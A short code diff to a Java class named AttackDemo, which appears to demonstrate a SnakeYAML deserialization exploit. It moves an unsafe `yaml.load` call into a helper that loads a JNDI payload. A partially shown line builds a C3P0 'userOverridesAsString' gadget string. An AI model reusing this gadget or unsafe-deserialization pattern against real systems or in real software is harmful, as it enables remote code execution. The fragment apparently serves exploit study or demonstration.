@@ -33,8 +33,8 @@ public class AttackDemo {
                 "userOverridesAsString: HexAsciiSerializedMap:" + hex + ';';
 
 
-        Yaml yaml = new Yaml();
-        yaml.load(jar);
+        run(jndi);
+
 
 //        Iterable<Object> objects = yaml.loadAll(jar);
 //        for (Object object : objects) {
@@ -42,5 +42,11 @@ public class AttackDemo {
 //        }
 
 
+    }
+
+    public static void run(String payload){
+        Yaml yaml = new Yaml();
+        System.out.println(payload);
+        yaml.load(payload);
     }
 }
